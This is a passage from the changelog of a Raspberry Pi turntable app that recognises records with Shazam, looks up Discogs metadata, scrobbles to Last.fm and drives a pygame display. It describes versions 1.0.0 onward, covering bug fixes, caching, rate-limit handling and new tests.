  The old `shutdown()` cancelled ALL tasks (including `main()` itself) and
  then called `loop.stop()` from inside `asyncio.run()`, which guarantees
  `RuntimeError: Event loop stopped before Future completed`.  Signal
  handlers now simply cancel the gathered pipeline tasks; `main()` unwinds
  through a `finally` block that stops capture and display, and
  `asyncio.run()` exits cleanly.

- **Fire-and-forget `asyncio.create_task()` results were never referenced**
  (`src/tracking/listen_tracker.py`, `src/display/renderer.py`).  asyncio
  holds only weak references to tasks, so a running task can in principle be
  garbage-collected mid-flight — and one of these tasks performs the Discogs
  play-count write.  Both classes now hold strong references in a
  `_bg_tasks` set, discarded via done-callback.

### Changed

- **Album-level metadata cache in `MetadataResolver`**
  (`src/metadata/resolver.py`).  A single Discogs resolve can cost 30+ HTTP
  requests (database search, up to 25 collection-membership checks, release
  + tracklist fetches), and every track on an album repeats the identical
  (artist, album) lookup.  `resolve()` now caches results per normalized
  (artist, album) key — Discogs hits and clean fallbacks alike — cutting
  per-LP API traffic by roughly 90%.  Fallback results are cached only when
  both Discogs tiers completed without raising, so a transient network error
  never pins an album to fallback metadata.  Bounded at 64 albums with
  LRU-style eviction.

- **Discogs 429 rate-limit handling** (`src/metadata/discogs_client.py`).
  All direct REST calls now route through a `_request()` helper that retries
  exactly once on HTTP 429, honoring the server's `Retry-After` header
  (clamped to 30s, defaulting to 2s when absent or unparseable).  Discogs
  allows 60 requests/minute; previously a 429 simply failed the operation.

- **Scaled cover art is now cached** (`src/display/renderer.py`).  The
  render loop re-renders ~10×/second to animate the pulsing dot, and every
  frame re-loaded the cover JPEG from disk and re-`smoothscale`d it — the
  single largest constant CPU cost on the Pi.  `_load_cover()` now caches
  the scaled Surface keyed by (url, w, h) in a 16-entry bounded cache.

- **Gradient background is now cached** (`src/display/renderer.py`).  The
  radial gradient (24 full-screen circle fills) is rendered once per
  (palette, size) onto an offscreen Surface and re-blitted each frame.  It
  only regenerates while a palette transition is actively lerping.  Together
  with the cover cache, steady-state render CPU drops by roughly an order of
  magnitude.

- **Shazam client is now reused across recognitions**
  (`src/audio/recognizer.py`).  `ShazamIOBackend` previously constructed a
  fresh `Shazam()` object (and its internal HTTP machinery) for every chunk,
  several times a minute.  One client is now created lazily on first use and
  reused.

- **`_BoundedCache` extracted as a reusable helper**
  (`src/display/renderer.py`).  The palette, scaled-cover, and gradient
  caches all share one insertion-ordered, LRU-refresh-on-get, size-capped
  implementation (previously inline dict juggling for the palette cache
  only).  Pure Python and unit-tested in `tests/test_renderer_caches.py`.

- **`overlap_seconds >= chunk_seconds` is now rejected at startup**
  (`src/audio/capture.py`).  Previously this misconfiguration was silently
  clamped to a zero-second sleep; it now logs a clear warning and disables
  overlap (the old clamp produced an infinite re-recognition of the same
  audio under the new windowing).

### Added

- **`tests/test_player_state.py`** (9 tests) — first coverage for
  `PlayerState`, including the regression test for the set_track
  notification bug and listener-exception isolation.
- **`tests/test_chunking.py`** (13 tests) — pins the ChunkAssembler
  windowing contract: overlap correctness, no lost audio across block
  boundaries, emitted chunks are independent copies, validation.
- **`tests/test_renderer_caches.py`** (13 tests) — `_BoundedCache` semantics
  (eviction order, LRU refresh, replacement) and the palette color math
  (`_lerp_color`, `_lerp_palette`, `_clamp_luminance`).
- **`tests/test_resolver.py`** (+7 tests) — album-cache behavior: cache hits
  skip Discogs, key normalization, fallback-caching rules, transient-error
  retry, bounded eviction.
- **`tests/test_discogs_client.py`** (+8 tests) — `_request()` rate-limit
  behavior: Retry-After honored/defaulted/capped, single retry only, POST
  routing, end-to-end increment-survives-429.
- **`tests/test_listen_tracker.py`** (+1 test) — `_end_session` task is
  strongly referenced until completion.

---

## [1.3.2] — 2026-05-26

**Bug-fix release — no new features.** Follow-up QA sweep of the v1.3.1
codebase identified four real bugs (including one site the v1.3.1
async-loop migration missed), four documentation inaccuracies, and nine
smaller hardening opportunities. Everything was fixed in a single pass.
Test count: 208 → 210 (two new model-level regression tests).

### Fixed

- **`resolver.py` was missed by the v1.3.1 `get_event_loop()` sweep**
  (`src/metadata/resolver.py`). The v1.3.1 CHANGELOG enumerated four files
  it swept; `resolver.py` was an eighth site that should have been included
  and wasn't.  `MetadataResolver.resolve()` (line 35) still called
  `asyncio.get_event_loop()` from inside a coroutine. Replaced with
  `asyncio.get_running_loop()` to match the rest of the codebase.

- **Dirty-flag clobber froze the pulsing dot and identifying spinner**
  (`src/display/renderer.py`).  The v1.3.1 fix that set
  `self._dirty = True` at the end of `_render_now_playing()` /
  `_render_listening()` was immediately overwritten by `self._dirty = False`
  one line later in the run loop, so the animation only ran during the 1s
  palette transition and then froze.  Reset `_dirty` BEFORE calling
  `_render()`, so the inner code can re-dirty for the next frame.

- **`PlaySession.log_track` latched a release_id without an instance_id**
  (`src/metadata/models.py`).  `DISCOGS_DATABASE` results legitimately have
  `discogs_release_id` set but `discogs_instance_id = None` (the user
  doesn't own that pressing).  The old guard `if release_id is None and
  track.discogs_release_id:` accepted these, which meant `_end_session()`
  later called `increment_play_count(release_id, None)` — building a
  URL ending in `…/instances/None/fields/…` that Discogs guaranteed to
  reject.  Tightened the guard to require BOTH IDs before latching.

- **Misleading test name + assertion in `test_listen_tracker.py`** —
  `test_database_source_without_instance_id_does_not_increment` was named
  as if it asserted the call was suppressed, but the body asserted
  `assert_called_once_with(12345, None)`, documenting the bug instead of
  catching it.  Renamed to
  `test_database_source_without_instance_id_does_not_call_increment` and
  flipped the assertion to `assert_not_called()` for both
  `increment_play_count` and `update_last_played`.

- **Inaccurate `CLAUDE.md` config snippet** — listed `discogs.token` but
  the actual key (used by `README.md`, `config.example.yaml`,
  `docs/architecture.md`, `docs/pi-setup-guide.md`, and the code) is
  `discogs.user_token`.  Corrected and expanded the snippet to include
  the other commonly-needed keys (`play_count_field_name`,
  `scrobble_enabled`, etc.) for accuracy.

- **`CLAUDE.md` `PlaySession` description was out of date** — described
  latching as "first Discogs-sourced track only," which under the new
  tightened rule is misleading.  Updated to spell out that BOTH IDs are
  required to latch, so DB-only results don't pre-empt the slot.

- **Architecture diagram in `docs/architecture.md`** showed
  `LastFmClient.love()` dangling under DisplayRenderer.  Re-grouped it
  under ListenTracker, where it actually runs.

### Added

- **HTTP timeouts on every Discogs API call** (`src/metadata/discogs_client.py`).
  Every `self._session.get` and `self._session.post` now passes
  `timeout=15`.  The high-level `discogs_client.Client` (used for
  `search()` and `release()` calls) gets matching limits via
  `set_timeout(connect=5, read=15)`.  Previously, a flaky CDN connection or
  a hung TCP socket could occupy an executor thread for minutes before the
  OS-level timeout kicked in.

- **Atomic, timeout-aware cover-art download**
  (`src/display/renderer.py`).  Replaced `urllib.request.urlretrieve` with
  a `requests.get(..., timeout=15, stream=True)` flow that writes to a
  `tempfile.NamedTemporaryFile` in the cache directory and then
  `os.replace`s into the final path.  No more half-written cache files
  surviving a network drop or process kill; no more unbounded executor
  thread occupancy.

- **Improved audio-device matching diagnostics**
  (`src/audio/capture.py`).  `_find_device_index` now logs all matching
  candidates when more than one input device matches the configured
  `device_name`, so users with multiple USB audio devices (e.g. UCA222 +
  USB mic) can see which one was picked from the logs.

- **Case- and whitespace-insensitive track comparison**
  (`src/audio/recognizer.py`).  Added a `_same_track` helper that
  `.strip().lower()`s title and artist before comparing.  Shazam
  occasionally returns subtly different formatting for the same track
  between chunks; without normalization those count as a new track and
  trigger an unnecessary re-resolve / re-scrobble.

- **Debug log when a recognition chunk is dropped**
  (`src/audio/recognizer.py`).  `enqueue` used to silently drop chunks
  when the queue was full; now it logs at DEBUG level so a "stopped
  identifying tracks" complaint has a breadcrumb in the journal.

- **Bounded `_palette_cache`** (`src/display/renderer.py`).  Added a
  200-entry LRU-ish cap so the per-cover palette cache can't grow
  unbounded over very long uptimes.  Re-running extraction on a cache
  miss is cheap (~ms per album), so eviction is harmless.

- **Mid-transition palette snap** (`src/display/renderer.py`).  If a new
  track arrives before the previous 1s palette lerp completes,
  `_queue_palette` now snaps `_current_palette` to the currently-rendered
  interpolated value before reassigning the target — so the new lerp
  starts from what the user is *currently seeing* instead of from a
  stale base palette.

- **Adaptive render cadence** (`src/display/renderer.py`).  The run loop
  now sleeps `1/30s` only during a palette transition (smooth lerp); the
  rest of the time it sleeps `1/10s`, plenty for the 0.8s pulsing dot
  but easier on the Pi's CPU.

- **README `venv` step** — added the standard `python3 -m venv venv` +
  activate instructions to the Setup block, matching what
  `docs/pi-setup-guide.md` already recommended.

- **Hardened `sync-version-badge.yml` regex** — replaced `[^-]*` with a
  pattern that survives hyphenated pre-release versions like `1.4.0-rc1`.

- **Two new regression tests in `tests/test_models.py`** covering the
  PlaySession latching tightening:
  - `test_log_track_does_not_latch_database_source_without_instance_id`
  - `test_log_track_database_then_collection_latches_collection_only`

---

## [1.3.1] — 2026-05-25

### Fixed

- **`asyncio.get_event_loop()` deprecated calls** — seven calls to the
  deprecated `asyncio.get_event_loop()` inside coroutines were replaced with
  `asyncio.get_running_loop()` across four files. `get_event_loop()` emits a
  `DeprecationWarning` in Python 3.10+ and raises `RuntimeError` in some
  contexts; `get_running_loop()` is the correct API inside a running event loop
  and raises `RuntimeError` immediately if called outside one, making bugs
  easier to catch.
  - `src/audio/capture.py` — `run()` coroutine (×1)
  - `src/audio/recognizer.py` — `_commit_track()` coroutine (×2, executor call
    for Last.fm scrobble)
  - `src/tracking/listen_tracker.py` — `_end_session()` coroutine (×3, all
    three `run_in_executor` calls for Discogs and Last.fm)
  - `main.py` — `shutdown()` coroutine (×1, `loop.stop()`)

- **ShazamIO album extraction nested-loop break** (`src/audio/recognizer.py`) —
  the `break` inside the inner `metadata` loop only exited the metadata
  iteration, not the outer `sections` loop. On multi-section Shazam responses,
  the code continued iterating through additional sections and could overwrite a
  valid album name with an empty string. Added a guard after the inner loop so
  the outer loop also exits once a non-empty album value is found.

- **Blocking cover-art download in async event loop**
  (`src/display/renderer.py`) — `urllib.request.urlretrieve()` was called
  synchronously inside `_load_cover()`, which runs on the main thread of the
  async event loop. This blocked audio capture, recognition, and all other
  async tasks for the duration of the HTTP download on each new track. Fixed by
  splitting responsibilities: `_load_cover()` now reads only from the disk
  cache and returns `None` immediately on a cache miss; a new
  `_prefetch_cover(url)` async method downloads the file in a thread-pool
  executor (`run_in_executor`) and is scheduled via `asyncio.create_task()`
  from `_on_state_change()`. Cover art loads asynchronously; a brief
  placeholder is shown if the cache miss occurs.

- **Pulsing NOW PLAYING dot froze after ~1 second**
  (`src/display/renderer.py`) — the animated `●` dot in the header strip is
  driven by `time.monotonic()` inside `_render_now_playing()`, but `_dirty`
  was never set to `True` after the initial render, so the render loop went
  idle and the animation froze. Added `self._dirty = True` at the end of
  `_render_now_playing()` to keep the loop re-rendering while the now-playing
  screen is active.

- **Genre chip overflow allowed an extra row** (`src/display/renderer.py`) —
  the bounding-box overflow check in the chip grid renderer used
  `y + chip_h > rect.y + rect.h + chip_h`, which permitted chips to overflow
  by a full `chip_h` before breaking. Changed to `y + chip_h > rect.y + rect.h`
  to clip correctly at the panel boundary.

- **Inconsistent color tuple for NEXT track label**
  (`src/display/renderer.py`) — the NEXT track name was rendered with
  `(*p.text[:3],)` (an unpacked 3-element slice wrapped in a tuple) while the
  PREV track name used `p.text` directly. Both are semantically identical when
  `p.text` is already a 3-tuple, but the NEXT label form was inconsistent and
  fragile if `DisplayPalette.text` were ever changed to a longer tuple. Changed
  to `p.text` to match the PREV label.

- **Wrong Last.fm auth URL in `get_lastfm_session_key.py`** — the help text
  printed at startup referenced `https://www.last.fm/api/accounts`, which
  returns a 404. Corrected to `https://www.last.fm/api/account/create`.

- **Negative sleep duration in `AudioCapture.run()`**
  (`src/audio/capture.py`) — if `overlap_seconds >= chunk_seconds` (a
  pathological but reachable config combination), `chunk_seconds -
  overlap_seconds` is negative and `asyncio.sleep()` raises a `ValueError`.
  The duration is now clamped: `await asyncio.sleep(max(0, chunk_seconds -
  overlap_seconds))`.

---

## [1.3.0] — 2026-05-25

### Added

- **Last.fm scrobbling** — every track confirmed by the recognition loop is
  automatically scrobbled to Last.fm. Scrobbles include artist, title, album,
  and the Unix timestamp of when the track was committed. Enabled via the new
  `lastfm.scrobble_enabled` config key (default `false`).
- **"Loved" mark on album completion** — when `love_on_completion: true` is
  set in config and a full album side plays through (i.e. `potential_last_track`
  fires), the last identified track is marked as Loved on Last.fm. Off by
  default. Failure is non-fatal and logged as a warning.
- **`src/tracking/lastfm_client.py`** — new `LastFmClient` class wrapping
  `pylast`. Synchronous (pylast is synchronous); async callers use
  `run_in_executor`, matching the `DiscogsClient` pattern. Graceful no-op when
  not configured or when pylast is not installed. No exception ever propagates
  out of this module — every failure is caught and returned as `False`.
- **`get_lastfm_session_key.py`** — one-time helper script at the repo root.
  Walks through the Last.fm desktop auth flow (token → browser approval →
  session key), then prints the session key to paste into `config.yaml`. The
  session key does not expire; the script only needs to be run once.
- New `lastfm` section in `config.example.yaml`:
  `scrobble_enabled`, `api_key`, `api_secret`, `session_key`, `love_on_completion`.
- **`pylast>=5.1.0`** added to `requirements.txt`.
- **15 new unit tests** in `tests/test_lastfm_client.py` covering: disabled
  config, missing config section, incomplete credentials, pylast ImportError,
  scrobble happy path, empty album → `None`, scrobble when disabled, scrobble
  exception handling, love happy path, love disabled by config, love when
  client disabled, love exception handling, `enabled` property, `love_on_completion`
  property, and full-credentials → enabled.
  Total unit test count: 193 → 208.

### Changed

- `RecognitionLoop.__init__` — accepts an optional `lastfm: LastFmClient`
  parameter (default `None`; backward-compatible).
- `RecognitionLoop._commit_track()` — records a Unix timestamp before
  resolving metadata, then fires `lastfm.scrobble()` in an executor after
  updating state and tracker. Scrobble failure is caught and logged; it never
  interrupts the main loop.
- `ListenTracker.__init__` — accepts an optional `lastfm: LastFmClient`
  parameter (default `None`; backward-compatible).
- `ListenTracker._end_session()` — after the Discogs Play Count and Last
  Played updates, calls `lastfm.love()` on the last identified track when
  `love_on_completion` is enabled. Independent of Discogs: a Discogs failure
  does not prevent the love call.
- `main.py` — constructs `LastFmClient(config)` at startup and injects it
  into both `ListenTracker` and `RecognitionLoop`.
- Module docstring for `listen_tracker.py` updated to document the Last.fm
  love step in the session-end logic.

---

## [1.2.2] — 2026-05-25

### Fixed

- **Cross-side boundary bug in `prev_track_title` / `next_track_title`** — both
  properties previously searched only within the current side's entries. This
  caused the first track on any non-first side (e.g. B1) to return `None` for
  `prev_track_title` instead of the last track of the preceding side (e.g. A3),
  and the last track on any non-last side (e.g. A3) to return `None` for
  `next_track_title` instead of the first track of the following side (e.g. B1).
  Both properties now fall back to the global tracklist when a side boundary is
  reached, correctly stitching sides together. A track that is genuinely first
  globally still returns `None` for `prev_track_title`; a track that is genuinely
  last globally still returns `None` for `next_track_title`.
- New unit tests cover the fixed behaviour:
  `test_prev_track_cross_side_b1_returns_last_of_a` (B1 prev → A3),
  `test_next_track_cross_side_last_a_returns_first_of_b` (A3 next → B1),
  `test_prev_track_very_first_track_is_none` (A1 has no predecessor),
  and `test_next_track_very_last_track_is_none` (B4 has no successor).
  Several pre-existing boundary tests were renamed for specificity; net
  test count: 192 → 193.

---

## [1.2.1] — 2026-05-25

### Changed

- **Dynamic title push-down layout** — the track title is now the unconstrained
  hero element. Instead of occupying a fixed 170px slot and scaling down when text
  overflows, the title takes as much vertical space as it naturally requires. The
  accent divider, artist name, album title, and genre chip badges then flow
  downward from the title's actual bottom edge. The meta footer and prev/next strip
  remain bottom-anchored and are never displaced.  Font size reduction is a last
  resort, applied only when the title genuinely cannot fit even after the secondary
  block has been pushed as far down as possible (i.e. the full budget is consumed).
- `_draw_wrapped_text()` now returns the actual rendered height in pixels so callers
  can position subsequent elements relative to the measured bottom edge.
- New `_measure_wrapped_text()` helper computes wrapped-text height without drawing,
  using the same word-wrap algorithm as `_draw_wrapped_text()` to ensure consistent
  measurement vs. render output.
- `_draw_genre_chips()` accepts an optional `chips_rect` parameter; when supplied it
  overrides `layout.genre_chips` for positioning, enabling dynamic y-coordinate injection.
- `_build_font_cache()` pre-builds stepped-down bold font variants (4 px steps from
  the default title size down to 18 px) into a new `_bold_fonts` dict, used by
  the title-scaling fallback in `_render_now_playing()`.

---

## [1.2.0] — 2026-05-25

### Added

- **"Museum Card" display redesign** — completely new layout derived from Claude Design
  mockups (DirectionA variant): cover art on the left (~440×440px), text panel on the
  right with a hero-scale track title (72px bold), a short accent divider line, artist
  name (48px), album name (32px italic serif), genre/style chip badges, a compact meta
  footer (year · label · catalog), and a prev/next track strip anchored to the bottom.
  A full-width header strip at the top shows a pulsing NOW PLAYING dot and the current
  side/position indicator (e.g. `SIDE A · 02 OF 03`).
- **Dynamic color theming** — album art is quantized to 8 colors via Pillow on each
  track change; the most vibrant color becomes the `accent`, the dominant color is
  darkened to `bg` and `surface`, and near-white tints produce `text` and `muted`. The
  five-field `DisplayPalette` dataclass carries the resolved theme. Palettes are cached
  per cover-art URL so extraction only runs once per album.
- **Radial gradient background** — concentric-circle approximation of a center-to-edge
  gradient (surface color at center → bg color at edges) rendered each frame during
  palette transitions; no new runtime dependencies (pure pygame).
- **1-second palette lerp transitions** — when a new track arrives, the renderer
  smoothly blends `_current_palette` → `_target_palette` over 1 second using
  `_lerp_color()` / `_lerp_palette()`. The run loop continues re-rendering until the
  transition completes, then returns to dirty-flag mode.
- **Genre/style chip badges** — Discogs `styles` (prepended) plus `genres` rendered as
  pill badges with 1px solid border, configurable padding, gap, and corner radius.
  Chips wrap to a second row when they overflow the panel width.
- **Word-wrapped hero track title** — title text is manually word-wrapped across
  multiple lines at the panel width; line height is 0.98× the font height.
- **Side-awareness properties on `TrackMetadata`** — five new computed properties
  derived from the tracklist: `side_letter` (e.g. `"A"`), `side_position` (1-based
  index within the side), `side_total` (track count for that side), `prev_track_title`,
  and `next_track_title`. All return `None` when the track is not found in the
  tracklist or has a numeric-only position string.
- **`genres` field on `TrackMetadata`** — Discogs `styles` followed by `genres` are
  concatenated into a single `genres: list[str]` field. No new API calls — both fields
  are already present in the release response; only extraction was added.
- **`DisplayPalette` dataclass** and **`FALLBACK_PALETTE`** constant in `models.py` —
  a neutral dark-grey fallback used when cover art is missing or extraction fails.
- **`_SIDE_RE` regex** exported from `models.py` — `r"^([A-Za-z]+)(\d+)$"` — parses
  Discogs position strings (e.g. `"B12"`) into `(side_letter, track_number)`.
- **44 new unit tests** across `test_models.py`, `test_layouts.py`, and
  `test_resolver.py` covering all new properties, layout geometry invariants (bounds,
  ordering, font hierarchy, scaling), and genres passthrough.

### Changed

- `NowPlayingLayout` — entirely new field set: 9 layout rects (`header_strip`,
  `cover_art`, `track_text`, `divider`, `artist_text`, `album_text`, `genre_chips`,
  `meta_text`, `prev_next`), 7 font sizes, and 5 chip geometry constants. The old
  3-column single-line layout is replaced by the Museum Card design.
- `get_now_playing_layout()` — all geometry now scales from a 1024×600 reference;
  cover art forced square via `min(sx, sy)` scaling to prevent distortion at non-16:9
  resolutions.
- `DisplayRenderer` — complete rewrite: three font dicts (`_fonts`, `_italic_fonts`,
  `_mono_fonts`) built at startup; dynamic palette fields wired into every draw call;
  radial gradient replaces solid fill; six new private draw methods.
- `DiscogsClient._build_result()` — now extracts `release.styles` (prepended) and
  `release.genres` into a combined `genres` list in the return dict.
- `MetadataResolver._from_discogs()` — passes `genres` through to `TrackMetadata`.
- Total unit test count: 148 → 192.

---

## [1.1.0] — 2026-05-24

### Added

- **Last Played date tracking** — on album completion, `DiscogsClient.update_last_played()`
  writes today's date (ISO 8601, `YYYY-MM-DD`) to a configurable "Last Played" custom
  field in the user's Discogs collection. The field is optional: if
  `discogs.last_played_field_name` is not set in `config.yaml`, the method is a
  graceful no-op and no API calls are made.
- `config.example.yaml` — added optional `last_played_field_name` key (commented out
  by default) with instructions for enabling it.
- 7 new unit tests in `tests/test_discogs_client.py` covering `update_last_played`
  (not configured no-op, happy path, ISO date format verification, field not found,
  non-204 POST, 401, exception handling).
- 3 new unit tests in `tests/test_listen_tracker.py` covering Last Played integration
  (called when configured, not called when unconfigured, failure is non-fatal).

### Changed

- `ListenTracker._end_session()` now calls `update_last_played()` after
  `increment_play_count()` when `last_played_field_name` is configured. A failure
  from `update_last_played` is logged as a warning but does not affect the Play Count
  result — the two updates are independent.
- Log message updated: "incrementing Play Count in Discogs" →
  "incrementing Play Count and updating Last Played in Discogs".
- Total unit test count: 138 → 148.

---

## [1.0.1] — 2026-05-24

### Changed

- **Play Count replaces "Listened?" boolean** — `DiscogsClient.mark_as_listened()`
  (which set a dropdown field to "Yes") is replaced by `increment_play_count()`,
  which reads the current integer value of a "Play Count" custom field and
  increments it by 1. An empty Play Count field implies unlistened, making the
  separate boolean redundant.
- `discogs.listened_field_name` and `discogs.listened_field_value` config keys
  replaced by a single `discogs.play_count_field_name` key.
- `ListenTracker` updated to call `increment_play_count()` instead of
  `mark_as_listened()`; log messages updated accordingly.

### Added

- `DiscogsClient._get_field_value()` — reads the current raw value of a custom
  field from the collection API response, used by `increment_play_count()` to
  determine the value before incrementing (read-before-write pattern; falls back
  to 0 on GET failure or blank field).
- `tests/test_discogs_client.py` — new unit test file covering 14 scenarios for
  `increment_play_count` and `_get_field_value` (blank field, existing counts,
  garbage values, field-not-found, GET/POST failures, exceptions).

---

## [1.0.0] — 2026-05-24

Initial release. Full core loop operational: turntable audio → Shazam
recognition → Discogs metadata → pygame display → Discogs field update.

### Added

**Audio pipeline**
- `AudioCapture` — records overlapping 15s chunks from USB audio interface
  via `sounddevice`; dispatches to silence detector and recognition queue
- `SilenceDetector` — RMS-based silence/music classification; emits
  `MUSIC_STARTED`, `MUSIC_STOPPED`, and `SESSION_ENDED` lifecycle events;
  `SESSION_ENDED` requires sustained silence after music (default 45s) and
  fires at most once per session

**Recognition**
- `RecognitionLoop` — async polling loop with configurable N-of-consecutive-
  matches confirmation gate (default 2) to prevent flickering on noisy results
- `ShazamIOBackend` — serialises audio to in-memory WAV, calls ShazamIO;
  swappable via `recognition.backend` config key (ACRCloud and AudD stubs ready)

**Metadata**
- `MetadataResolver` — three-tier lookup chain: Discogs collection →
  Discogs database → MusicBrainz/Shazam fallback; always returns a
  `TrackMetadata` regardless of which tier succeeds
- `DiscogsClient` — collection search with 25-candidate database cross-
  reference strategy plus full collection-walk fallback for rare pressings;
  custom field update via Discogs REST API
- `CoverArtFallback` — MusicBrainz Cover Art Archive lookup for releases
  not found in Discogs

**Display**
- `DisplayRenderer` — pygame fullscreen renderer at configurable resolution
  (default 1024×600 for Waveshare 7" HDMI LCD H); dirty-flag redraw at ~30fps
- Three screens: idle (dark), listening ("Listening…"), now-playing (cover
  art + artist / album / track / meta / position / source badge)
- `NowPlayingLayout` — proportional pixel geometry; resolution-independent;
  scales correctly at 640×480, 800×480, 1024×600, 1280×720
- Cover art downloaded from Discogs/MusicBrainz URLs with MD5-keyed disk cache
- Fallback source indicator badge when metadata comes from MusicBrainz

**State & tracking**
- `PlayerState` — central in-memory state with observer pattern;
  status enum: `IDLE → LISTENING → PLAYING → IDLE`
- `ListenTracker` — manages `PlaySession` lifecycle; updates Discogs field
  only when last track is confirmed AND release is in collection (conservative
  by design — partial plays do not trigger an update)
- `PlaySession` — deduplicates consecutive track logs; latches release/instance
  IDs from the first Discogs-sourced track

**Infrastructure**
- `VERSION` file at repo root; `main.py` logs version at startup
- GitHub Actions workflow auto-syncs README version badge when `VERSION` changes
- 124-test unit suite covering all non-hardware components (models, silence
  detection, listen tracker, metadata resolver, recognition loop, display layout)
- `test_discogs_live.py` — live Discogs integration test with read-only and
  `--test-write` modes; tests collection search, database search, tracklist
  fetch, custom field detection, and field update

**Documentation**
- `docs/architecture.md` — full system design, component reference, data flows,
  state machine, config reference
- `docs/testing-guide.md` — prerequisites, test inventory, run commands,
  per-suite descriptions, common failure modes
- `docs/pi-setup-guide.md` — OS flash, display config, UCA222 setup, venv,
  first run, systemd autostart, troubleshooting
- `docs/hardware-guide.md` — parts list and wiring diagram
- `docs/roadmap.md` — versioned feature plan through v1.6.0
